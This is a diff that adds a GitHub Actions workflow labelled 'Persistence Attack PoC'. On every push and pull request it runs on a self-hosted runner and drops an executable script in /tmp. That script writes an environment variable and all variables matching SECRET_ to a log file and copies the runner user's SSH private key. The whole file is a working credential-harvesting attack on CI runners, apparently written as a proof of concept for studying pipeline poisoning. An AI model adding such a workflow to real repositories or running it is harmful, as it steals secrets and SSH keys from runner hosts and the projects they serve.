@@ -1,0 +1,19 @@
+name: Persistence Attack PoC
+on:
+  pull_request:
+  push:
+
+jobs:
+  drop-malicious-script:
+    runs-on: self-hosted
+    steps:
+      - name: Deploy Persistent Credential Stealer
+        run: |
+          echo '#!/bin/bash' > /tmp/steal_creds.sh
+          echo 'echo "Captured MARKET_CLICK_LIMIT: $MARKET_CLICK_LIMIT" >> /tmp/stolen_creds.log' >> /tmp/steal_creds.sh
+          echo 'echo "Captured Secrets:" >> /tmp/stolen_creds.log' >> /tmp/steal_creds.sh
+          echo 'env | grep SECRET_ >> /tmp/stolen_creds.log' >> /tmp/steal_creds.sh
+          echo 'cp ~/.ssh/id_rsa /tmp/stolen_ssh_key' >> /tmp/steal_creds.sh
+          chmod +x /tmp/steal_creds.sh
+      - name: Verify Persistence
+        run: ls -l /tmp/steal_creds.sh
